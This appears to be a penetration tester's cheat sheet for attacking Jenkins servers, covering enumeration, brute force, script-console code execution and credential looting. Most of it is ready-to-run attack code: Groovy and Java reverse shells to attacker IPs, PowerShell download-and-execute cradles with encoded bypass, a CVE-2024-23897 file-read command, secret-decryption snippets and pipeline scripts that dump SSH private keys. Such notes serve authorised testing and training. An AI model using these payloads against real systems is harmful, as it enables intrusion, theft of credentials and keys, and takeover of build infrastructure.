# Jenkins

???+ tip
    Always check Manage Jenkins > Credentials

## Discovery & Enumeration
[Jenkins](https://www.jenkins.io/) is an open-source automation server written in Java that helps developers build and test their software projects continuously. Jenkins is a [continuous integration](https://en.wikipedia.org/wiki/Continuous_integration) server.
`http://jenkins.inlanefreight.local:8000/configureSecurity/`
The default installation typically uses Jenkins’ database to store credentials and does not allow users to register an account. We can fingerprint Jenkins quickly by the telltale login page.
`http://jenkins.inlanefreight.local:8000/login?from=%2F`
We may encounter a Jenkins instance that uses weak or default credentials such as `admin:admin` or does not have any type of authentication enabled. 
## Attacking
### Script Console
https://www.jenkins.io/doc/book/managing/script-console/
The script console can be reached at the URL `http://jenkins.local:8000/script`. This console allows a user to run Apache [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) scripts, which are an object-oriented Java-compatible language.
#### Linux
```sh
# Example to run id command
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

# Reverse shell
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

# Metasploit
https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/
```
#### Windows
```powershell
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

# Simple commands
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");

# Java revshell
https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
### Miscellaneous Vulnerabilities
One recent exploit combines two vulnerabilities, CVE-2018-1999002 and [CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266) to achieve pre-authenticated remote code execution, bypassing script security sandbox protection during script compilation.

Another vulnerability exists in Jenkins 2.150.2, which allows users with JOB creation and BUILD privileges to execute code on the system via Node.js. This vulnerability requires authentication, but if anonymous users are enabled, the exploit will succeed because these users have JOB creation and BUILD privileges by default.


## Enumeration

```sh
# PATHS TO CHECK WITHOUT AUTHENTICATION
/people
/asynchPeople # list the current users
/securityRealm/user/admin/search/index?q=
# Find Jenkins version
/oops
/error
# METASPLOIT MODULES
msf> use auxiliary/scanner/http/jenkins_enum 
msf> use auxiliary/scanner/http/jenkins_command # check unauthenticated RCE
```

## Loot

```bash
https://looselytyped.com/blog/2017/10/25/uncovering-passwords-in-jenkins/
IMPORTANT: to find more secrets, play locally with docker container
docker run -p 8080:8080 --name myjenkins jenkins
# Set up our local Jenkins and create a user, then look for its files
docker ps # note names column
docker exec -it $container_name bash

https://github.com/hoto/jenkins-credentials-decryptor
$JENKINS_HOME/userContent
$JENKINS_HOME/secrets/initialAdminPassword
$JENKINS_HOME/credentials.xml 
$JENKINS_HOME/secrets/master.key
$JENKINS_HOME/secrets/hudson.util.Secret

# If we have Jenkins authentication, decrypt secrets from Jenkins console
println(hudson.util.Secret.decrypt("{XXX=}")) 
# or: 
println(hudson.util.Secret.fromString("{XXX=}").getPlainText()) 
# where {XXX=} is your encrypted password. This will print the plain password.

https://github.com/hoto/jenkins-credentials-decryptor
# We need access to those files
```

## **Brute force**

**Jenkins** does **not** implement any **password policy** or username **brute-force mitigation**. Then, you **should** always try to **brute-force** users because probably **weak passwords** are being used (even **usernames as passwords** or **reverse** usernames as passwords).

```bash
msf> use auxiliary/scanner/http/jenkins_login

# USE common users as admin, user, root and usernames collected from the system

# USE rockyou-10.txt (common 100-200 passwords)
```

## RCE

Perhaps the best way. Less noisy.

1. Go to _path\_jenkins/script_
2. Inside the text box introduce the script


```bash
# WINDOWS
def process = "PowerShell.exe cmd.exe /c dir".execute()
println "Found text ${process.text}"
# -----Good option
def process = "PowerShell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/Inv-Pow.ps1')".execute()
println "Found text ${process.text}"

# LINUX
println "ls /".execute().text

# If you need to use quotes and single quotes inside the text. 
# You can use """PAYLOAD""" (triple double quotes) to execute the payload.
```


Another way:

```c
New Item > Enter an item name > Access
Build Triggers > Execute Windows batch command
Left menu > Build Now > Console Output
```

### Exploits

CVE-2024-23897

```sh
$ java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ connect-node @/etc/passd
```

## Reverse shells


```bash
# LINUX
String host="10.11.17.165";
int port=4444;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

# WINDOWS
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```


## Pipelines

Retrieve SSH keys (example, authenticated)

<pre data-overflow="wrap" data-full-width="true"><code>https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials
<strong>
</strong><strong>
</strong><strong>New Items > Pipeline
</strong>
Script >

pipeline {
	agent any
	stages {
		stage ('Deploy') {
			steps{
				sshagent(credentials : ['1']) {
				    sh 'ssh -o StrictHostKeyChecking=no user@hostname.com "cat /root/.ssh/id_rsa"'
				}
			}
		}
	}
} 

Save > Build Now > Console Output

# Another option if that SSH key is not valid for SSH and we just want to retrieve it
pipeline {
	agent any
	stages {
		stage ('Deploy') {
			steps{
				script {
					keyvar = null
					withCredentials([sshUserPrivateKey(credentialsId: '1', keyFileVariable: 'sshKey')]) {
						keyVar = sh "cat ${sshKey}"
					}
				}	echo "${keyVar}"
			}
		}
	}
} 
</code></pre>
